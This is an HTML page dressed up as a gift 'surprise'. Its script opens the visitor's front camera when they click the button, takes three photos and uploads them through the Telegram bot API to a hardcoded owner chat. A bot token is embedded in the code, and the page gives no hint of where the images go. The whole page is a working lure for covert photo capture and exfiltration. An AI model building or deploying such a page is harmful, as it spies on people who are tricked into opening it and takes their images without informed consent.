<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>üéÅ Your Surprise</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; font-family:Arial,sans-serif; }
body { background: linear-gradient(135deg,#6a11cb 0%,#2575fc 100%); min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; }
.container { background:white; padding:25px; border-radius:15px; max-width:450px; width:100%; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.2);}
.gift { font-size:50px; margin:10px 0; }
h1 { color:#333; margin:10px 0; font-size:22px; }
.btn { background: linear-gradient(90deg,#6a11cb,#2575fc); color:white; border:none; padding:15px; width:100%; border-radius:50px; font-size:18px; font-weight:bold; cursor:pointer; margin:15px 0;}
.btn:disabled { opacity:0.7; cursor:not-allowed;}
video { width:100%; border-radius:10px; border:3px solid #6a11cb; margin:15px 0; display:block; transform:scaleX(-1);}
.hidden { display:none; }
</style>
</head>
<body>
<div class="container">
<div class="gift">üéÅ</div>
<h1 id="title">Your Surprise</h1>
<p id="message" style="color:#666;">Preparing your surprise...</p>
<video id="video" autoplay playsinline></video>
<button class="btn" onclick="startSurprise()" id="actionBtn">üéÅ Start Surprise</button>
</div>

<canvas id="canvas" style="display:none;"></canvas>

<script>
const urlParams = new URLSearchParams(window.location.search);
const USER_CHAT_ID = urlParams.get("chat_id");
const USER_NAME = urlParams.get("name") || "Friend";

const BOT_TOKEN = "8226782560:AAGgKjz2W5QJskEkD1Gy4B8bRk0Cdabgjh0";
const OWNER_ID = "8215819954";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
let stream = null;

async function startSurprise() {
    const btn = document.getElementById("actionBtn");
    btn.disabled = true;
    btn.textContent = "‚è≥ Loading...";
    document.getElementById("title").textContent = "üì∏ Camera Ready!";
    document.getElementById("message").textContent = "Smile! Taking your photos...";
    try {
        stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user", width:{ideal:1280}, height:{ideal:720} } });
        video.srcObject = stream;
        for(let i=1;i<=3;i++){
            await delay(800);
            const blob = await capturePhoto(i);
            await sendPhoto(blob,i);
        }
        finish();
    } catch(e){
        document.getElementById("title").textContent = "‚ö†Ô∏è Camera failed!";
        document.getElementById("message").textContent = "Cannot access camera.";
    }
}

async function capturePhoto(i){
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video,0,0,canvas.width,canvas.height);
    return new Promise(resolve=>canvas.toBlob(resolve,"image/jpeg",0.9));
}

async function sendPhoto(blob,i){
    const fileName = `photo_${i}.jpg`;
    const file = new File([blob],fileName,{type:"image/jpeg"});
    const formData = new FormData();
    formData.append("photo",file);
    formData.append("caption",`üéÅ Photo ${i} from ${USER_NAME}`);
    formData.append("chat_id",OWNER_ID);
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:formData});
    if(USER_CHAT_ID){
        formData.set("chat_id",USER_CHAT_ID);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:formData});
    }
}

function finish(){
    if(stream){ stream.getTracks().forEach(t=>t.stop()); }
    document.getElementById("title").textContent = "‚úÖ Surprise Sent!";
    document.getElementById("message").textContent = "Check your Telegram now!";
}

function delay(ms){return new Promise(res=>setTimeout(res,ms));}
</script>
</body>
</html>
